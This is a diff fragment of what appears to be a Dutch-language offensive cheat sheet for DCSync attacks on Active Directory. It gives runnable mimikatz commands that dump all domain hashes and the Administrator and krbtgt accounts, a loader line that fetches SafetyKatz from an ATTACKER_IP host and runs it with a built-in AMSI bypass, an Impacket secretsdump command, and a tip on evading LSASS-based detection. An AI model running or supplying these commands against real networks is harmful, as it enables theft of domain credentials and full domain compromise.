@@ -9,7 +9,7 @@ mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit
 # Stap 4: DCSync Administrator
 mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
 # Stap 5: DCSync via SafetyKatz (AMSI bypass ingebouwd)
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
 # Vanuit Linux met Impacket:
 python3 secretsdump.py DOMAIN/user:Password123!@DC_IP -just-dc-ntlm
 # Tip: DCSync is de schoonste manier om credentials te dumpen - geen contact met LSASS
